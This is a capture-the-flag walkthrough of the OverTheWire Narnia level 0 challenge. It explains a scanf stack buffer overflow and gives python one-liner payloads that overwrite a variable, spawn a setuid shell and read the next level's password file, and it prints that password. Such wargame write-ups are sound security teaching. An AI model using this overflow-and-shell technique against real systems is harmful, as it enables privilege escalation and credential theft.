```bash
user@host:~$ ssh narnia0@narnia.labs.overthewire.org -p 2226

```

As we can read from the game description: `PASSWORDS for each level are stored in /etc/somegame_pass/`. Let us start there. After a few tries it is clear we can't get any information on the files containing the passwords for other levels.

```bash
narnia0@narnia:/etc/narnia_pass$ file narnia0
narnia0: ASCII text
narnia0@narnia:/etc/narnia_pass$ file narnia1
narnia1: regular file, no read permission
```

In the `/` directory a folder named `narnia` exists.

```bash
narnia0@narnia:/narnia$ ls
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4    narnia5.c  narnia7    narnia8.c
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: narnia0
buf: narnia0
val: 0x41414141
WAY OFF!!!!
```

The program `narnia0.c` goes (excluding the licensing information):

```c
narnia0@narnia:/narnia$ cat narnia0.c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

So no matter what we enter into the program, the buffer is never compared to anything. However, the buffer is 20 bytes long but we read 24 bytes into it. Since `scanf` reads the input and puts the memory on the stack, it might overwrite the `val` variable. This is what we wiull try to exploit.

`0xdeadbeef` is the hexadecimal representation of the 32-bit number 3735928559, so it is 4 bytes long. Let's see if we can feed 20 bytes into the program AND something like this number. Lert us start with investigating whether our intuition is right.

```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 000000000000000000001234
val: 0x34333231
WAY OFF!!!!
```

This is an interesting result. The first 20 `0` characters are read into the buffer, and the last four bytes are read into `val`, but they are oriented backwards! So if we orient the characters backwards in the input it will be read forwards. This is exactly the buffer overflow that `scanf` causes.

Let's automate this a bit. We have `python` in our path:

```bash
narnia0@narnia:/narnia$ python --version
Python 2.7.13
```

We can hence create these strings without having to count the `0`'s by feeding a small program as a string and having it execute, piping the output into the `narnia0` program.

```bash
narnia0@narnia:/narnia$ python -c 'print "0"*20 + "feebdaed"'
00000000000000000000feebdaed
```

Let's try with what we know so far!

```
narnia0@narnia:/narnia$ python -c 'print "0"*20 + "feebdaed"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000feeb
val: 0x62656566
WAY OFF!!!!
```

We can see that feeding the string as ASCII text is not satisfactory. If we inspect the feedback, we can see that `val` is now equal to `0x62656566`, which is hexadecimal for the word `beef`. So in some way, only the last part of the word made it in. Let's try feeding in bytes instead

```
narnia0@narnia:/narnia$ python -c 'print "0"*20 + "\xde\xad\xbe\xef"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ޭ��
val: 0xefbeadde
WAY OFF!!!!
```

We can almost read `deadbeef`! We just have to remember that the bytes are read pair-wise!

```
narnia0@narnia:/narnia$ python -c 'print "0"*20 + "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
val: 0xdeadbeef
```

This works! But nothing seems to happen...

If we look at the source code, we casn see that two things happen once we set `val` to `deadbeef`:

    1. setreuid90 sets the user id of the calling process (which is our terminal)
    2. A new shell is started by system(), but it exits as it does not get any input

So we just need to feed it more commands! That is simple by using parenthesis:

```
narnia0@narnia:/narnia$ (python -c 'print "0"*20 + "\xef\xbe\xad\xde"'; echo id;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
val: 0xdeadbeef
uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
```

Now just read the password from the folder.

```
narnia0@narnia:/narnia$ (python -c 'print "0"*20 + "\xef\xbe\xad\xde"'; echo cat ../etc/narnia_pass/narnia1 ;) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
val: 0xdeadbeef
efeidiedae
```
